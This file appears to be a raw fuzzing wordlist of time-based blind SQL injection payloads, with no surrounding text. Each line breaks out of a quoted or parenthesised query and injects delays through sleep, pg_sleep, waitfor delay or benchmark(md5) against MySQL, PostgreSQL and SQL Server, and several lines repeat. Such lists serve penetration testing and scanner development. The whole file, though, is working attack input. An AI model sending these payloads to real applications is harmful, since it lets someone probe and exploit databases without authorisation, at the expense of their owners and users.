+1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '
+1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||'
+1"   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #
+1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --
+1" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and "kojr"  =  "kojr
+1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk
+1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'
+1" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   
+1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636
+1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  "%"  =  "
+select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr
+1"   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +'
+1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%"  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #
+select pg_sleep  (  5  )   and    (    (   "byhx" like "byhx
+1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf
+1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--
+1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%"   )    )    or sleep  (  5  )   and    (    (   "%"  =  "
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --
+1"  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1"   )    )     )   or sleep  (  5  )   and    (    (     (  "hdis" like "hdis
+1"   )    )     )   or sleep  (  5  )   and    (    (     (  "eran"  =  "eran
+1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and "azzv" like "azzv
+select sleep  (  5  )   and    (    (     (  "wucy" like "wucy
+1"   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--
+1%"   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '
+1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf
+1"   )    )     )   rlike sleep  (  5  )   and    (    (     (  "eefg"  =  "eefg
+   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  '
+1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--
+1" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and "ojpe" like "ojpe
+1"   )    )     )   waitfor delay '0:0:5' and    (    (     (  "ckht"  =  "ckht
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  '
+1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --
+waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta
+1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1"   )    )    rlike sleep  (  5  )   and    (    (   "ahhx" like "ahhx
+1%" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select sleep  (  5  )   and    (    (   "vzye"  =  "vzye
+1" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and "ojpe" like "ojpe
+1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1%" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and "%"  =  "
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   
+1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --
+1"  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1"   )    )     )   or sleep  (  5  )   and    (    (     (  "eran"  =  "eran
+1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #
+1" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct
+1"   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf
+1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs
+waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '
+1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy
+1%"   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1%"   )    )    or sleep  (  5  )   and    (    (   "%"  =  "
+1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--
+1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --
+1"  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp
+1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "lsis" like "lsis
+1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu
+1"   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--
+1"   )    )    rlike sleep  (  5  )   and    (    (   "ahhx" like "ahhx
+1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv
+1"   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq
+1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #
+1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   
+1" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and "ojpe" like "ojpe
+1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags
+1' where 1045  =  1045 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin
+1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1"  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --
+1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq
+1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+ select sleep  (  5  )   and    (    (   "rthl" like "rthl
+1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs
+1%"   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  '
+1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik
